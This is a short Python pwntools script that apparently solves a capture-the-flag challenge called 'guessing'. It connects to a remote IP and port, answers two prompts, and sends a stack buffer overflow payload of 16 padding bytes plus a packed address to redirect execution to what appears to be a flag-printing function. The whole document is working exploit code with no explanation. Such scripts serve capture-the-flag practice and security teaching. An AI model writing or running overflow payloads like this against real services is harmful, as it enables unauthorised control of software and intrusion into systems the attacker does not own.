from pwn import *
import time

s = remote("103.237.99.35", 25032)
#s = process("./guessing")
flag = 0x80487c5
s.recvuntil("1: ")
s.sendline("1")
s.recvuntil("2: ")
s.sendline("2")
s.recvuntil("3: ")
payload = "a"*0x10 + p32(flag)
s.sendline(payload)
s.recv()
time.sleep(1)
print s.recv()
s.close()